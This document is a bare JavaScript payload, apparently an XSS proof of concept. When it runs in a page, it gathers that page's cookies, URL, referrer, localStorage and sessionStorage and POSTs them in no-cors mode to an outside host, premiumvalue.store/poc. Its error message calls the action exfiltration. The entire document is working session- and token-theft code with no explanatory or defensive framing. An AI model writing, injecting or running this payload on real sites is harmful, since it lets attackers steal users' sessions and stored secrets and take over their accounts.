(async () => {
  const data = {
    url: location.href,
    cookies: document.cookie,
    referrer: document.referrer,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage }
  };

  try {
    await fetch('https://premiumvalue.store/poc', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 'Content-Type': 'application/json' },
      mode: 'no-cors'
    });
  } catch (e) {
    console.error('Exfiltration failed:', e);
  }
})();
